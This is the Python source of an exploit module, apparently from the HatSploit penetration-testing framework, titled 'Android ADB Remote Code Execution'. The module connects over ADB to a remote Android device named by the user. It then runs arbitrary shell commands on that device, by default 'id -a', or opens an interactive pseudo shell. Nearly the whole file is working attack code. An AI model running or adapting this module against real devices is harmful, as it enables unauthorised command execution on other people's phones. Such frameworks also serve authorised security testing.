#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.cli.badges import badges
from core.cli.parser import parser

from utils.adb_tools import adb_tools
from utils.pseudo_shell import pseudo_shell

class HatSploitModule:
    def __init__(self):
        self.badges = badges()
        self.parser = parser()
        
        self.adb_tools = adb_tools()
        self.pseudo_shell = pseudo_shell()
        
        self.details = {
            'Name': "Android ADB Remote Code Execution",
            'Module': "exploit/android/adb/remote_code_execution",
            'Authors': [
                'enty8080'
            ],
            'Description': "Remote Code Execution in Android ADB.",
            'Dependencies': [
                ''
            ],
            'Comments': [
                ''
            ],
            'Risk': "medium"
        }
        
        self.options = {
            'RHOST': {
                'Description': "Remote host.",
                'Value': None,
                'Required': True
            },
            'COMMAND': {
                'Description': "Command to execute.",
                'Value': "id -a",
                'Required': True
            },
            'PSEUDO': {
                'Description': "Spawn Pseudo shell.",
                'Value': "no",
                'Required': False
            }
        }
        
    def clean_up(self):
        self.badges.output_process("Stopping ADB server...")
        
        if not self.adb_tools.stop_adb_server():
            self.badges.output_error("Failed to stop ADB server!")
        
    def execute_command(self, command):
        self.badges.output_process("Attempting to execute command...")
        command_output = self.adb_tools.execute_adb_command("shell", command)
        
        if command_output:
            self.badges.output_information("Command output:")
            self.badges.output_empty(command_output)
        else:
            self.badges.output_warning("No output provided by command.")
        
    def start_server(self):
        self.badges.output_process("Starting ADB server...")
        
        if not self.adb_tools.start_adb_server():
            self.badges.output_error("Failed to start ADB server!")
            return
        
    def run(self):
        remote_host, command, pseudo = self.parser.parse_options(self.options)
        
        self.badges.output_process("Checking ADB installation...")
        if not self.adb_tools.check_adb_installation():
            self.badges.output_error("ADB is not installed!")
            return
        
        self.start_server()
        self.badges.output_process("Exploiting " + remote_host + "...")
        
        if not self.adb_tools.connect(remote_host):
            self.badges.output_error("Exploit failed!")
            self.clean_up()
            return
        
        if not self.adb_tools.check_connected(remote_host):
            self.badges.output_error("Exploit failed!")
            self.clean_up()
            return
        
        if pseudo in ['yes', 'y']:
            self.pseudo_shell.spawn_pseudo_shell(self.details['Name'], self.execute_command)
        else:
            self.execute_command(command)
            
        self.clean_up()
